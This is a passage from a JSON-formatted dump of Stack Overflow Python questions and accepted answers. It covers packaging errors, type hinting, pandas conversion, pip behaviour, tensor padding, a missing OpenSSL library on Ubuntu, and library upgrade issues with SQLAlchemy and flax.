    "Body": "I am trying to install a library from the source that makes use of Poetry, but I get this error\nerror: Multiple top-level packages discovered in a flat-layout: ['tulips', 'fixtures'].\n        \nTo avoid accidental inclusion of unwanted files or directories,\nsetuptools will not proceed with this build.\n        \nIf you are trying to create a single distribution with multiple packages\non purpose, you should not rely on automatic discovery.\nInstead, consider the following options:\n        \n1. set up custom discovery (`find` directive with `include` or `exclude`)\n2. use a `src-layout`\n3. explicitly set `py_modules` or `packages` with a list of names\n        \nTo find more information, look for \"package discovery\" on setuptools docs\n\nWhat do I need to do to fix it?\n",
    "AcceptedAnswerId": 72547402,
    "AcceptedAnswer": "Based on this comment on a GitHub issue, adding the following lines to your pyproject.toml might solve your problem:\n[tool.setuptools]\npy-modules = []\n\n(For my case, the other workaround provided in that comment, i.e. adding py_modules=[] as a keyword argument to the setup() function in setup.py  worked)\n"
}
{
    "Id": 72199354,
    "PostTypeId": 1,
    "Title": "Python type hinting for a generic mutable tuple / fixed length sequence with multiple types",
    "Body": "I am currently working on adding type hints to a project and can't figure out how to get this right. I have a list of lists, with the nested list containing two elements of type int and float. The first element of the nested list is always an int and the second is always a float.\nmy_list = [[1000, 5.5], [1432, 2.2], [1234, 0.3]]\n\nI would like to type annotate it so that unpacking the inner list in for loops or loop comprehensions keeps the type information. I could change the inner lists to tuples and would get what I'm looking for:\ndef some_function(list_arg: list[tuple[int, float]]): pass\n\n\nHowever, I need the inner lists to be mutable. Is there a nice way to do this for lists? I know that abstract classes like Sequence and Collection do not support multiple types.\n",
    "AcceptedAnswerId": 73817809,
    "AcceptedAnswer": "I think the question highlights a fundamental difference between statically typed Python and dynamically typed Python. For someone who is used to dynamically typed Python (or Perl or JavaScript or any number of other scripting languages), it's perfectly normal to have diverse data types in a list. It's convenient, flexible, and doesn't require you to define custom data types. However, when you introduce static typing, you step into a tighter box that requires more rigorous design.\nAs several others have already pointed out, type annotations for lists require all elements of the list to be the same type, and don't allow you to specify a length. Rather than viewing this as a shortcoming of the type system, you should consider that the flaw is in your own design. What you are really looking for is a class with two data members. The first data member is named 0, and has type int, and the second is named 1, and has type float. As your friend, I would recommend that you define a proper class, with meaningful names for these data members. As I'm not sure what your data type represents, I'll make up names, for illustration.\nclass Sample:\n    def __init__(self, atomCount: int, atomicMass: float):\n        self.atomCount = atomCount\n        self.atomicMass = atomicMass\n\nThis not only solves the typing problem, but also gives a major boost to readability. Your code would now look more like this:\nmy_list = [Sample(1000, 5.5), Sample(1432, 2.2), Sample(1234, 0.3)]\n\ndef some_function(list_arg: list[Sample]): pass\n\nI do think it's worth highlighting Stef's comment, which points to this question. The answers given highlight two useful features related to this.\nFirst, as of Python 3.7, you can mark a class as a data class, which will automatically generate methods like __init__(). The Sample class would look like this, using the @dataclass decorator:\nfrom dataclasses import dataclass\n\n@dataclass\nclass Sample:\n    atomCount: int\n    atomicMass: float\n\nAnother answer to that question mentions a PyPi package called recordclass, which it says is basically a mutable namedtuple. The typed version is called RecordClass\nfrom recordclass import RecordClass\n\nclass Sample(RecordClass):\n    atomCount: int\n    atomicMass: float\n\n"
}
{
    "Id": 73302071,
    "PostTypeId": 1,
    "Title": "NoneType error when trying to use pdb via FormmatedTB",
    "Body": "When executing the following code:\nfrom IPython.core import ultratb\nsys.excepthook = ultratb.FormattedTB(mode='Verbose', color_scheme='Linux', call_pdb=1)\n\nIn order to catch exceptions, I receive the following error:\nTraceback (most recent call last):\n  File \"\", line 1, in \n  File \"/Users/dinari/miniconda3/envs/testenv/lib/python3.8/site-packages/IPython/core/ultratb.py\", line 994, in __init__\n    VerboseTB.__init__(self, color_scheme=color_scheme, call_pdb=call_pdb,\n  File \"/Users/dinari/miniconda3/envs/testenv/lib/python3.8/site-packages/IPython/core/ultratb.py\", line 638, in __init__\n    TBTools.__init__(\n  File \"/Users/dinari/miniconda3/envs/testenv/lib/python3.8/site-packages/IPython/core/ultratb.py\", line 242, in __init__\n    self.pdb = debugger_cls()\nTypeError: 'NoneType' object is not callable\n\nUsing python 3.8.2 and IPython 8.4.0\npdb otherwise is working fine.\nAny idea for a fix for this?\n",
    "AcceptedAnswerId": 73304196,
    "AcceptedAnswer": "Downgrading IPython to 7.34.0 solved this.\n"
}
{
    "Id": 72554445,
    "PostTypeId": 1,
    "Title": "Pandas: convert a series which contains strings like \"10%\" and \"0.10\" into numeric",
    "Body": "What is the best way to convert a Pandas series that contains strings of the type \"10%\" and \"0.10\" into numeric values?\nI know that if I have a series with just \"0.10\" type strings I can just do pd.to_numeric.\nI also know that if I have a series of \"10%\" type strings I can do str.replace(\"%\",\"\") and then do pd.to_numeric and divide by 100.\nThe issue I have is for a series with a mix of \"0.10\" and \"10%\" type strings. How do I best convert this into a series with the correct numeric types.\nI think I could do it by first making a temporary series with True / False depending on if the string has \"%\" in it or not and then based on that applying a function. But this seems inefficient.\nIs there a better way?\nWhat I Have Tried for Reference:\nmixed = pd.Series([\"10%\",\"0.10\",\"5.5%\",\"0.02563\"])\nmixed.str.replace(\"%\",\"\").astype(\"float\")/100\n\n0    0.100000\n1    0.001000\n2    0.055000\n3    0.000256\ndtype: float64\n# This doesn't work, because even the 0.10 and 0.02563 are divided by 100.\n\n",
    "AcceptedAnswerId": 72554525,
    "AcceptedAnswer": "The easiest solution is to select entries using a mask and handle them in bulk:\nfrom pandas import Series, to_numeric\n\nmixed = Series([\"10%\", \"0.10\", \"5.5%\", \"0.02563\"])\n\n# make an empty series with similar shape and dtype float\nconverted = Series(index=mixed.index, dtype='float')\n\n# use a mask to select specific entries\nmask = mixed.str.contains(\"%\")\n\nconverted.loc[mask] = to_numeric(mixed.loc[mask].str.replace(\"%\", \"\")) / 100\nconverted.loc[~mask] = to_numeric(mixed.loc[~mask])\n\nprint(converted)\n# 0    0.10000\n# 1    0.10000\n# 2    0.05500\n# 3    0.02563\n# dtype: float64\n\n"
}
{
    "Id": 73302356,
    "PostTypeId": 1,
    "Title": "How to make pip fail early when one of the requested requirements does not exist?",
    "Body": "Minimal example:\npip install tensorflow==2.9.1 non-existing==1.2.3\n\nDefaulting to user installation because normal site-packages is not writeable\nLooking in indexes: https://pypi.org/simple, https://pypi.ngc.nvidia.com\nCollecting tensorflow==2.9.1\n  Downloading tensorflow-2.9.1-cp310-cp310-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (511.7 MB)\n     \u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501 511.7/511.7 MB 7.6 MB/s eta 0:00:00\nERROR: Could not find a version that satisfies the requirement non-existing==1.2.3 (from versions: none)\nERROR: No matching distribution found for non-existing==1.2.3\n\n\nSo pip downloads the (rather huge) TensorFlow first, only to then tell me that non-existing does not exist.\nIs there a way to make it fail earlier, i.e., print the error and quit before downloading?\n",
    "AcceptedAnswerId": 73304263,
    "AcceptedAnswer": "I'm afraid there's no straightforward way of handling it. I ended up writing a simple bash script where I check the availability of packages using pip's index command:\ncheck_packages_availability () {\n  while IFS= read -r line || [ -n \"$line\" ]; do\n      package_name=\"${line%%=*}\"\n      package_version=\"${line#*==}\"\n\n      if ! pip index versions $package_name | grep \"$package_version\"; then\n        echo \"package $line not found\"\n        exit -1\n      fi\n  done < requirements.txt\n}\n\nif ! check_packages_availability; then\n  pip install -r requirements.txt\nfi\n\nThis is a hacky solution but may work. For every package in requirements.txt this script tries to retrieve information about it and match the specified version. If everything's alright it starts installing them.\n\nOr you can use poetry, it handles resolving dependencies for you, for example:\npyproject.toml\n[tool.poetry]\nname = \"test_missing_packages\"\nversion = \"0.1.0\"\ndescription = \"\"\nauthors = [\"funnydman\"]\n\n[tool.poetry.dependencies]\npython = \"^3.10\"\ntensorflow = \"2.9.1\"\nnon-existing = \"1.2.3\"\n\n[build-system]\nrequires = [\"poetry-core>=1.0.0\"]\nbuild-backend = \"poetry.core.masonry.api\"\n\nAt the resolving stage it throws exception without installing/downloading packages:\nUpdating dependencies\nResolving dependencies... (0.2s)\n\nSolverProblemError\n    \nBecause test-missing-packages depends on non-existing (1.2.3) which doesn't match any versions, version solving failed.\n\n"
}
{
    "Id": 72596436,
    "PostTypeId": 1,
    "Title": "How to perform approximate structural pattern matching for floats and complex",
    "Body": "I've read about and understand floating point round-off issues such as:\n>>> sum([0.1] * 10) == 1.0\nFalse\n\n>>> 1.1 + 2.2 == 3.3\nFalse\n\n>>> sin(radians(45)) == sqrt(2) / 2\nFalse\n\nI also know how to work around these issues with math.isclose() and cmath.isclose().\nThe question is how to apply those work arounds to Python's match/case statement.  I would like this to work:\nmatch 1.1 + 2.2:\n    case 3.3:\n        print('hit!')  # currently, this doesn't match\n\n",
    "AcceptedAnswerId": 72596437,
    "AcceptedAnswer": "The key to the solution is to build a wrapper that overrides the __eq__ method and replaces it with an approximate match:\nimport cmath\n\nclass Approximately(complex):\n\n    def __new__(cls, x, /, **kwargs):\n        result = complex.__new__(cls, x)\n        result.kwargs = kwargs\n        return result\n\n    def __eq__(self, other):\n        try:\n            return isclose(self, other, **self.kwargs)\n        except TypeError:\n            return NotImplemented\n\nIt creates approximate equality tests for both float values and complex values:\n>>> Approximately(1.1 + 2.2) == 3.3\nTrue\n>>> Approximately(1.1 + 2.2, abs_tol=0.2) == 3.4\nTrue\n>>> Approximately(1.1j + 2.2j) == 0.0 + 3.3j\nTrue\n\nHere is how to use it in a match/case statement:\nfor x in [sum([0.1] * 10), 1.1 + 2.2, sin(radians(45))]:\n    match Approximately(x):\n        case 1.0:\n            print(x, 'sums to about 1.0')\n        case 3.3:\n            print(x, 'sums to about 3.3')\n        case 0.7071067811865475:\n            print(x, 'is close to sqrt(2) / 2')\n        case _:\n            print('Mismatch')\n\nThis outputs:\n0.9999999999999999 sums to about 1.0\n3.3000000000000003 sums to about 3.3\n0.7071067811865475 is close to sqrt(2) / 2\n\n"
}
{
    "Id": 72766397,
    "PostTypeId": 1,
    "Title": "Abbreviation similarity between strings",
    "Body": "I have a use case in my project where I need to compare a key-string with a lot many strings for similarity. If this value is greater than a certain threshold, I consider those strings \"similar\" to my key and based on that list, I do some further calculations / processing.\nI have been exploring fuzzy matching string similarity stuff, which use edit distance based algorithms like \"levenshtein, jaro and jaro-winkler\" similarities.\nAlthough they work fine, I want to have a higher similarity score if one string is \"abbreviation\" of another. Is there any algorithm/ implementation I can use for this.\nNote:\nlanguage: python3 \npackages explored: fuzzywuzzy, jaro-winkler\n\nExample:\nusing jaro_winkler similarity:\n\n>>> jaro.jaro_winkler_metric(\"wtw\", \"willis tower watson\")\n0.7473684210526316\n>>> jaro.jaro_winkler_metric(\"wtw\", \"willistowerwatson\")\n0.7529411764705883\n\nusing levenshtein similarity:\n\n>>> fuzz.ratio(\"wtw\", \"willis tower watson\")\n27\n>>> fuzz.ratio(\"wtw\", \"willistowerwatson\")\n30\n>>> fuzz.partial_ratio(\"wtw\", \"willistowerwatson\")\n67\n>>> fuzz.QRatio(\"wtw\", \"willistowerwatson\")\n30\n\nIn these kind of cases, I want score to be higher (>90%) if possible. I'm ok with few false positives as well, as they won't cause too much issue with my further calculations. But if we match s1 and s2 such that s1 is fully contained in s2 (or vice versa), their similarity score should be much higher.\nEdit: Further Examples for my Use-Case\nFor me, spaces are redundant. That means, wtw is considered abbreviation for \"willistowerwatson\" and \"willis tower watson\" alike.\nAlso, stove is a valid abbreviation for \"STack OVErflow\" or \"STandardOVErview\"\nA simple algo would be to start with 1st char of smaller string and see if it is present in the larger one. Then check for 2nd char and so on until the condition satisfies that 1st string is fully contained in 2nd string. This is a 100% match for me.\nFurther examples like wtwx to \"willistowerwatson\" could give a score of, say 80% (this can be based on some edit distance logic). Even if I can find a package which gives either True or False for abbreviation similarity would also be helpful.\n",
    "AcceptedAnswerId": 72870998,
    "AcceptedAnswer": "You can use a recursive algorithm, similar to sequence alignment. Just don't give penalty for shifts (as they are expected in abbreviations) but give one for mismatch in first characters.\nThis one should work, for example:\ndef abbreviation(abr,word,penalty=1):\n    if len(abr)==0:\n        return 0\n    elif len(word)==0:\n        return penalty*len(abr)*-1\n    elif abr[0] == word[0]:\n        if len(abr)>1:\n            return 1 + max(abbreviation(abr[1:],word[1:]),\n                           abbreviation(abr[2:],word[1:])-penalty)\n        else:\n            return 1 + abbreviation(abr[1:],word[1:])\n    else:\n        return abbreviation(abr,word[1:])\n\ndef compute_match(abbr,word,penalty=1):\n    score = abbreviation(abbr.lower(),\n                         word.lower(),\n                         penalty)\n    if abbr[0].lower() != word[0].lower(): score-=penalty\n    \n    score = score/len(abbr)\n\n    return score\n\n\nprint(compute_match(\"wtw\", \"willis tower watson\"))\nprint(compute_match(\"wtwo\", \"willis tower watson\"))\nprint(compute_match(\"stove\", \"Stackoverflow\"))\nprint(compute_match(\"tov\", \"Stackoverflow\"))\nprint(compute_match(\"wtwx\", \"willis tower watson\"))\n\nThe output is:\n1.0\n1.0\n1.0\n0.6666666666666666\n0.5\n\nIndicating that wtw and wtwo are perfectly valid abbreviations for willistowerwatson, that stove is a valid abbreviation of Stackoverflow but not tov, which has the wrong first character.\nAnd wtwx is only partially valid abbreviation for willistowerwatson beacuse it ends with a character that does not occur in the full name.\n"
}
{
    "Id": 73269000,
    "PostTypeId": 1,
    "Title": "Efficient logic to pad tensor",
    "Body": "I'm trying to pad a tensor of some shape such that the total memory used by the tensor is always a multiple of 512\nE.g.\nTensor shape 16x1x1x4 of type SI32 (Multiply by 4 to get total size)\nThe total elements are 16x4x1x1 = 64\nTotal Memory required 64x**4** = 256 (Not multiple of 512)\nPadded shape would be 32x1x1x4 = 512\n\nThe below logic works for the basic shape but breaks with a shape e.g. 16x51x1x4 SI32 or something random say 80x240x1x1 U8\nThe padding logic goes like below\nfrom functools import reduce\n\nDATA_TYPE_MULTIPLYER = 2 # This would change at runtime with different type e.g. 8 with U8 16 with F16 32 with SI32\n\nALIGNMENT = 512 #Always Constant\nCHAR_BIT = 8    # Always Const for given fixed Arch\n\ndef approachOne(tensor):\n    totalElements = reduce((lambda x, y: x * y), tensor)\n    totalMemory = totalElements * DATA_TYPE_MULTIPLYER\n    \n    divisor = tensor[1] * tensor[2] * tensor[3]\n    tempDimToPad = totalElements/divisor\n    orgDimToPad = totalElements/divisor\n    while (True):\n        if ((tempDimToPad * divisor * DATA_TYPE_MULTIPLYER) % ALIGNMENT == 0):\n            return int(tempDimToPad - orgDimToPad)\n        tempDimToPad = tempDimToPad + 1;\n    \ndef getPadding(tensor):\n    totalElements = reduce((lambda x, y: x * y), tensor)\n    totalMemory = totalElements * DATA_TYPE_MULTIPLYER\n    newSize = totalMemory + (ALIGNMENT - (totalMemory % ALIGNMENT))\n    newTotalElements = (newSize * CHAR_BIT) / (CHAR_BIT * DATA_TYPE_MULTIPLYER)\n    \n    # Any DIM can be padded, using first for now\n    paddingValue = tensor[0] \n    padding =  int(((newTotalElements * paddingValue) / totalElements) - paddingValue)\n    return padding\n    \ntensor = [11, 7, 3, 5]\nprint(getPadding(tensor))\nprint(approachOne(tensor))\n\ntensorflow package may help here but I'm originally coding in C++ so just posting in python with a minimal working example\nAny help is appreciated, thanks\nApproach 1\nthe brute force approach is to keep on incrementing across any chosen dimension by 1 and check if the totalMemory is multiple of 512. The brute force approach works but doesn't give the minimal padding and bloats the tensor\nUpdating the conditions\nInitially the approach was to pad across the first dim. Since always padding the first dimension my not be the best solution, just getting rid of this constraint\n",
    "AcceptedAnswerId": 73336113,
    "AcceptedAnswer": "If you want the total memory to be a multiple of 512 then the number of elements in the tensor must be a multiple of 512 // DATA_TYPE_MULTIPLIER, e.g. 128 in your case. Whatever that number is, it will have a prime factorization of the form 2**n. The number of elements in the tensor is given by s[0]*s[1]*...*s[d-1] where s is a sequence containing the shape of the tensor and d is an integer, the number of dimensions. The product s[0]*s[1]*...*s[d-1] also has some prime factorization and it is a multiple of 2**n if and only if it contains these prime factors. I.e. the task is to pad the individual dimensions s[i] such that the resulting prime factorization of the product s[0]*s[1]*...*s[d-1] contains 2**n.\nIf the goal is to reach a minimum possible size of the padded tensor, then one can simply iterate through all multiples of the given target number of elements to find the first one that can be satisfied by padding (increasing) the individual dimensions of the tensor (1). A dimension must be increased as long as it contains at least one prime factor that is not contained in the target multiple size. After all dimensions have been increased such that their prime factors are contained in the target multiple size, one can check the resulting size of the candidate shape: if it matches the target multiple size we are done; if its prime factors are a strict subset of the target multiple prime factors, we can add the missing prime factors to any of the dimensions (e.g. the first); otherwise, we can use the excess prime factors to store the candidate shape for a future (larger) multiplier. The first such future multiplier then marks an upper boundary for the iteration over all possible multipliers, i.e. the algorithm will terminate. However, if the candidate shape (after adjusting all the dimensions) has an excess of prime factors w.r.t. the target multiple size as well as misses some other prime factors, the only way is to iterate over all possible padded shapes with size bound by the target multiple size.\nThe following is an example implementation:\nfrom collections import Counter\nimport itertools as it\nimport math\nfrom typing import Iterator, Sequence\n\n\ndef pad(shape: Sequence[int], target: int) -> tuple[int,...]:\n    \"\"\"Pad the given `shape` such that the total number of elements\n       is a multiple of the given `target`.\n    \"\"\"\n    size = math.prod(shape)\n    if size % target == 0:\n        return tuple(shape)\n\n    target_prime_factors = get_prime_factors(target)\n\n    solutions: dict[int, tuple[int,...]] = {}  # maps `target` multipliers to corresponding padded shapes\n\n    for multiplier in it.count(math.ceil(size / target)):\n\n        if multiplier in solutions:\n            return solutions[multiplier]\n\n        prime_factors = [*get_prime_factors(multiplier), *target_prime_factors]\n        \n        def good(x):\n            return all(f in prime_factors for f in get_prime_factors(x))\n\n        candidate = list(shape)\n        for i, x in enumerate(candidate):\n            while not good(x):\n                x += 1\n            candidate[i] = x\n\n        if math.prod(candidate) == multiplier*target:\n            return tuple(candidate)\n\n        candidate_prime_factor_counts = Counter(f for x in candidate for f in get_prime_factors(x))\n        target_prime_factor_counts = Counter(prime_factors)\n\n        missing = target_prime_factor_counts - candidate_prime_factor_counts\n        excess = candidate_prime_factor_counts - target_prime_factor_counts\n\n        if not excess:\n            return (\n                candidate[0] * math.prod(k**v for k, v in missing.items()),\n                *candidate[1:],\n            )\n        elif not missing:\n            solutions[multiplier * math.prod(k**v for k, v in excess.items())] = tuple(candidate)\n        else:\n            for padded_shape in generate_all_padded_shapes(shape, bound=multiplier*target):\n                padded_size = math.prod(padded_shape)\n                if padded_size == multiplier*target:\n                    return padded_shape\n                elif padded_size % target == 0:\n                    solutions[padded_size // target] = padded_shape\n\n\ndef generate_all_padded_shapes(shape: Sequence[int], *, bound: int) -> Iterator[tuple[int,...]]:\n    head, *tail = shape\n    if bound % head == 0:\n        max_value = bound // math.prod(tail)\n    else:\n        max_value = math.floor(bound / math.prod(tail))\n    for x in range(head, max_value+1):\n        if tail:\n            yield from ((x, *other) for other in generate_all_padded_shapes(tail, bound=math.floor(bound/x)))\n        else:\n            yield (x,)\n\n\ndef get_prime_factors(n: int) -> list[int]:\n    \"\"\"From: https://stackoverflow.com/a/16996439/3767239\n       Replace with your favorite prime factorization method.\n    \"\"\"\n    primfac = []\n    d = 2\n    while d*d <= n:\n        while (n % d) == 0:\n            primfac.append(d)  # supposing you want multiple factors repeated\n            n //= d\n        d += 1\n    if n > 1:\n       primfac.append(n)\n    return primfac\n\nHere are a few examples:\npad((16, 1, 1), 128) = (128, 1, 1)\npad((16, 51, 1, 4), 128) = (16, 52, 1, 4)\npad((80, 240, 1, 1), 128) = (80, 240, 1, 1)\npad((3, 5, 7, 11), 128) = (3, 5, 8, 16)\npad((3, 3, 3, 1), 128) = (8, 4, 4, 1)\npad((7, 7, 7, 7), 128) = (7, 8, 8, 8)\npad((9, 9, 9, 9), 128) = (10, 10, 10, 16)\n\n\nFootnotes:\n(1) In fact, we need to find the roots of the polynomial (s[0]+x[0])*(s[1]+x[1])*...*(s[d-1]+x[d-1]) - multiple*target for x[i] >= 0 over the domain of integers. However, I am not aware of any algorithm to solve this problem.\n"
}
{
    "Id": 72133316,
    "PostTypeId": 1,
    "Title": "libssl.so.1.1: cannot open shared object file: No such file or directory",
    "Body": "I've just updated to Ubuntu 22.04 LTS and my libs using OpenSSL just stopped working.\nLooks like Ubuntu switched to the version 3.0 of OpenSSL.\nFor example, poetry stopped working:\nTraceback (most recent call last):\n  File \"/home/robz/.local/bin/poetry\", line 5, in \n    from poetry.console import main\n  File \"/home/robz/.local/share/pypoetry/venv/lib/python3.9/site-packages/poetry/console/__init__.py\", line 1, in \n    from .application import Application\n  File \"/home/robz/.local/share/pypoetry/venv/lib/python3.9/site-packages/poetry/console/application.py\", line 7, in \n    from .commands.about import AboutCommand\n  File \"/home/robz/.local/share/pypoetry/venv/lib/python3.9/site-packages/poetry/console/commands/__init__.py\", line 4, in \n    from .check import CheckCommand\n  File \"/home/robz/.local/share/pypoetry/venv/lib/python3.9/site-packages/poetry/console/commands/check.py\", line 2, in \n    from poetry.factory import Factory\n  File \"/home/robz/.local/share/pypoetry/venv/lib/python3.9/site-packages/poetry/factory.py\", line 18, in \n    from .repositories.pypi_repository import PyPiRepository\n  File \"/home/robz/.local/share/pypoetry/venv/lib/python3.9/site-packages/poetry/repositories/pypi_repository.py\", line 33, in \n    from ..inspection.info import PackageInfo\n  File \"/home/robz/.local/share/pypoetry/venv/lib/python3.9/site-packages/poetry/inspection/info.py\", line 25, in \n    from poetry.utils.env import EnvCommandError\n  File \"/home/robz/.local/share/pypoetry/venv/lib/python3.9/site-packages/poetry/utils/env.py\", line 23, in \n    import virtualenv\n  File \"/home/robz/.local/share/pypoetry/venv/lib/python3.9/site-packages/virtualenv/__init__.py\", line 3, in \n    from .run import cli_run, session_via_cli\n  File \"/home/robz/.local/share/pypoetry/venv/lib/python3.9/site-packages/virtualenv/run/__init__.py\", line 11, in \n    from ..seed.wheels.periodic_update import manual_upgrade\n  File \"/home/robz/.local/share/pypoetry/venv/lib/python3.9/site-packages/virtualenv/seed/wheels/__init__.py\", line 3, in \n    from .acquire import get_wheel, pip_wheel_env_run\n  File \"/home/robz/.local/share/pypoetry/venv/lib/python3.9/site-packages/virtualenv/seed/wheels/acquire.py\", line 12, in \n    from .bundle import from_bundle\n  File \"/home/robz/.local/share/pypoetry/venv/lib/python3.9/site-packages/virtualenv/seed/wheels/bundle.py\", line 4, in \n    from .periodic_update import periodic_update\n  File \"/home/robz/.local/share/pypoetry/venv/lib/python3.9/site-packages/virtualenv/seed/wheels/periodic_update.py\", line 10, in \n    import ssl\n  File \"/home/robz/.pyenv/versions/3.9.10/lib/python3.9/ssl.py\", line 98, in \n    import _ssl             # if we can't import it, let the error propagate\nImportError: libssl.so.1.1: cannot open shared object file: No such file or directory\n\nIs there an easy fix ? For example, having libssl.so.1.1 available without having to uninstall OpenSSL 3 (I don't know if it's even possible).\n",
    "AcceptedAnswerId": 72633324,
    "AcceptedAnswer": "This fixes it (a problem with packaging in 22.04):\nwget http://nz2.archive.ubuntu.com/ubuntu/pool/main/o/openssl/libssl1.1_1.1.1f-1ubuntu2.17_amd64.deb\n\nsudo dpkg -i libssl1.1_1.1.1f-1ubuntu2.17_amd64.deb\n\nPS: If the link is expired, check http://nz2.archive.ubuntu.com/ubuntu/pool/main/o/openssl/?C=M;O=D for a valid one.\nCurrent version is: libssl1.1_1.1.1f-1ubuntu2.17_amd64.deb\n"
}
{
    "Id": 72325242,
    "PostTypeId": 1,
    "Title": "type object 'Base' has no attribute '_decl_class_registry'",
    "Body": "I am upgrading a library to a recent version of SQLAlchemy and I am getting this error\n\ntype object 'Base' has no attribute '_decl_class_registry'\n\nOn line\nBase = declarative_base(metadata=metadata)\n\nBase._decl_class_registry\n\nHow can I solve this?\n",
    "AcceptedAnswerId": 72738555,
    "AcceptedAnswer": "Had the same problem. Because of my upgrade of sqlalchemy looks like there is a change in the base code.\nuse this instead to accomplish the same\nBase.registry._class_registry.values()\n\n"
}
{
    "Id": 73924768,
    "PostTypeId": 1,
    "Title": "AttributeError: module 'flax' has no attribute 'nn'",
    "Body": "I'm trying to run RegNeRF, which requires flax. On installing the latest version of flax==0.6.0, I got an error stating flax has no attribute optim. This answer suggested to downgrade flax to 0.5.1. On doing that, now I'm getting the error AttributeError: module 'flax' has no attribute 'nn'\nI could not find any solutions on the web for this error. Any help is appreciated.\nI'm using ubuntu 20.04\n",
    "AcceptedAnswerId": 73926711,
    "AcceptedAnswer": "The flax.optim module has been moved to optax as of flax version 0.6.0; see Upgrading my Codebase to Optax for information on how to migrate your code. If you're using external code that imports flax.optim and can't update these references, you'll have to install flax version 0.5.3 or older.\nRegarding flax.nn: this module was replaced by flax.linen in flax version 0.4.0. See Upgrading my Codebase to Linen for information on this migration. If you're using external code that imports flax.nn and can't update these references, you'll have to install flax version 0.3.6 or older.\n"
}
{
    "Id": 71530764,
    "PostTypeId": 1,
    "Title": "Binance order: Timestamp for this request was 1000ms ahead of the server's time",
    "Body": "I am writing some Python code to create an order with the Binance API:\nfrom binance.client import Client\n\nclient = Client(API_KEY, SECRET_KEY)\n\nclient.create_order(symbol='BTCUSDT',\n                    recvWindow=59999, #The value can't be greater than 60K\n                    side='BUY',\n                    type='MARKET',\n                    quantity = 0.004)\n\nUnfortunately I get the following error message:\n\"BinanceAPIException: APIError(code=-1021): Timestamp for this request was 1000ms ahead of the server's time.\"\n\nI already checked the difference (in miliseconds) between the Binance server time and my local time:\nimport time\nimport requests\nimport json\nurl = \"https://api.binance.com/api/v1/time\"\nt = time.time()*1000\nr = requests.get(url)\n\nresult = json.loads(r.content)\n\nprint(int(t)-result[\"serverTime\"]) \n\nOUTPUT: 6997\n\nIt seems that the recvWindow of 60000 is still not sufficient (but it may not exceed 60K). I still get the same error.\nDoes anybody know how I can solve this issue?\nMany thanks in advance!\n",
    "AcceptedAnswerId": 72763542,
    "AcceptedAnswer": "Probably the PC's time is out of sync.\nYou can do it using Windows -> Setting-> Time & Language -> Date & Time -> 'Sync Now'.\nScreenshot:\n\n"
}
{
    "Id": 73997582,
    "PostTypeId": 1,
    "Title": "Should I repeat parent class __init__ arguments in the child class's __init__, or using **kwargs instead",
    "Body": "Imagine a base class that you'd like to inherit from:\nclass Shape:\n    def __init__(self, x: float, y: float):\n        self.x = x\n        self.y = y\n\nThere seem to be two common patterns of handling a parent's kwargs in a child class's __init__ method.\nYou can restate the parent's interface completely:\nclass Circle(Shape):\n    def __init__(self, x: float, y: float, radius: float):\n        super().__init__(x=x, y=y)\n        self.radius = radius\n\nOr you can specify only the part of the interface which is specific to the child, and hand the remaining kwargs to the parent's __init__:\nclass Circle(Shape):\n    def __init__(self, radius: float, **kwargs):\n        super().__init__(**kwargs)\n        self.radius = radius\n\nBoth of these seem to have pretty big drawbacks, so I'd be interested to hear what is considered standard or best practice.\nThe \"restate the interface\" method is appealing in toy examples like you commonly find in discussions of Python inheritance, but what if we're subclassing something with a really complicated interface, like pandas.DataFrame or logging.Logger?\nAlso, if the parent interface changes, I have to remember to change all of my child class's interfaces to match, type hints and all. Not very DRY.\nIn these cases, you're almost certain to go for the **kwargs option.\nBut the **kwargs option leaves the user unsure about which arguments are actually required.\nIn the toy example above, a user might naively write:\ncircle = Circle()  # Argument missing for parameter \"radius\"\n\nTheir IDE (or mypy or Pyright) is being helpful and saying that the radius parameter is required.\ncircle = Circle(radius=5)\n\nThe IDE (or type checker) is now happy, but the code won't actually run:\nTraceback (most recent call last):\n  File \"foo.py\", line 13, in \n    circle = Circle(radius=5)\n  File \"foo.py\", line 9, in __init__\n    super().__init__(**kwargs)\nTypeError: Shape.__init__() missing 2 required positional arguments: 'x' and 'y'\n\nSo I'm stuck with a choice between writing out the parent interface multiple times, and not being warned by my IDE when I'm using a child class incorrectly.\nWhat to do?\nResearch\nThis mypy issue is loosely related to this.\nThis reddit thread has a good rehearsal of the relevant arguments for/against each approach I outline.\nThis SO question is maybe a duplicate of this one. Does the fact I'm talking about __init__ make any difference though?\nI've found a real duplicate, although the answer is a bit esoteric and doesn't seem like it would qualify as best, or normal, practice.\n",
    "AcceptedAnswerId": 74027245,
    "AcceptedAnswer": "If the parent class has required (positional) arguments (as your Shape class does), then I'd argue that you must include those arguments in the __init__ of the child (Circle) for the sake of being able to pass around \"shape-like\" instances and be sure that a Circle will behave like any other shape.  So this would be your Circle class:\nclass Shape:\n    def __init__(x: float, y: float):\n        self.x = x\n        self.y = y\n\n\nclass Circle(Shape):\n    def __init__(x: float, y: float, radius: float):\n        super().__init__(x=x, y=y)\n        self.radius = radius\n\n\n# The expectation is that this should work with all instances of `Shape`\ndef move_shape(shape: Shape, x: float, y: float):\n    shape.x = x\n    shape.y = y\n\nHowever if the parent class is using optional kwargs, that's where stuff gets tricky.  You shouldn't have to define colour: str on your Circle class just because colour is an optional argument for Shape.  It's up to the developer using your Circle class to know the interface of all shapes and if need be, interrogate the code and note that Circle can accept colour=green as it passes **kwargs to its parent constructor:\nclass Shape:\n    def __init__(x: float, y: float, colour: str = \"black\"):\n        self.x = x\n        self.y = y\n        self.colour = colour \n\n\nclass Circle(Shape):\n    def __init__(x: float, y: float, radius: float, **kwargs):\n        super().__init__(x=x, y=y, **kwargs)\n        self.radius = radius\n\n\ndef move_shape(shape: Shape, x: float, y: float):\n    shape.x = x\n    shape.y = y\n\n\ndef colour_shape(shape: Shape, colour: str):\n    shape.colour = colour\n\nGenerally my attitude is that a docstring exists to explain why something is written the way it is, not what it's doing.  That should be clear from the code.  So, if your Circle requires an x and y parameter for use in the parent class, then it should say as much in the signature.  If the parent class has optional requirements, then **kwargs is sufficient in the child class and it's incumbent upon the developer to interrogate Circle and Shape to see what the options are.\n"
}
{
    "Id": 72876146,
    "PostTypeId": 1,
    "Title": "Handling GIL when calling python lambda from C++ function",
